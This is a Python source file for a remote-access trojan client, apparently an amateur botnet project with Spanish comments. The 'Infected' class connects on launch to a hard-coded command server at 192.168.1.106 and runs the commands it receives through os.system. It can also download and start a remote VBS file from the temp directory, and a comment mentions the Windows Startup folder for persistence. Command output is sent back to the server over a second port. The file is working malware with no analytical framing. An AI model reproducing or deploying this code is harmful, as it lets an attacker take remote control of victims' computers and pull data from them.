import socket
from time import sleep
import os
import tempfile
import urllib.request


class ParserInfected:
    
    def getCommand(self, data):
        dataAux = data.split(" @ ")
        return getattr(self, dataAux[0])(dataAux)
        
    def specificCommandIp(self, listOfParameters):
        ip = listOfParameters[2]
        command = listOfParameters[1]
        isFinish = listOfParameters[3]
        myIP = socket.gethostbyname(socket.gethostname())
        if(ip == myIP):
            return self.nativeCommand(["esto es al pedo no estoy seguro",command,isFinish])
    
    def downloadVBS(self, listOfParameters):
        #Descargar
        url = listOfParameters[1]
        #path = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" PASARLO a VBS
        local_filename, headers = urllib.request.urlretrieve (url,  tempfile.gettempdir()+"/" + listOfParameters[2])
        
        #Ejecutar
        return "start "+ tempfile.gettempdir() +"/"+ listOfParameters[2], not listOfParameters[3].startswith("T")
        
    def nativeCommand(self, listOfParameters):
        return listOfParameters[1]+" > "+ tempfile.gettempdir() +"/file.txt", not listOfParameters[2].startswith("T")

class Infected:

    def __init__(self, ip, portReceiveCommand, portSendOutput):
        self.ipServer = ip
        self.portReceiveCommand = portReceiveCommand
        self.portSendOutput = portSendOutput
        self.lastAction = "None"
        self.isNotFinish = True
        self.parser = ParserInfected()
        
    def getDataFromSocket(self, socket):
        return socket.recv(2000).decode("utf-8")
                
    def listenForAction(self):
        while self.isNotFinish:
            # Create a TCP/IP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            
            # Connect the socket to the port where the server is listening
            server_address = (self.ipServer, self.portReceiveCommand)
            sock.connect(server_address)  
            print("Conection")      
            try:
                # Receive action
                action = self.getDataFromSocket(sock)                
            finally:
                sock.close()
            
            if action != self.lastAction:
                print("change action!")
                self.lastAction = action
                self.executeAction(action)
                
            else:
                sleep(10)
    
    def executeAction(self, data):
        command, end = self.parser.getCommand(data)
        self.isNotFinish = end
        os.system(command)  
        self.sendOutput()
    
    def readCommand(self):
        
        path = tempfile.gettempdir() + "/file.txt"
        infile = open(path, 'r')
        text = ""
        for line in infile:
            text += line   
        infile.close()  
        return text        
    
    def sendOutput(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        server_address = (self.ipServer, self.portSendOutput)
        sock.connect(server_address)
        output = self.readCommand()
        
        try:
            # Receive action
            sock.sendall(bytes(output,"utf-8"))                
        finally:
            sock.close()  
                
  
     
    
inf = Infected("192.168.1.106", 10000, 10001)
inf.listenForAction()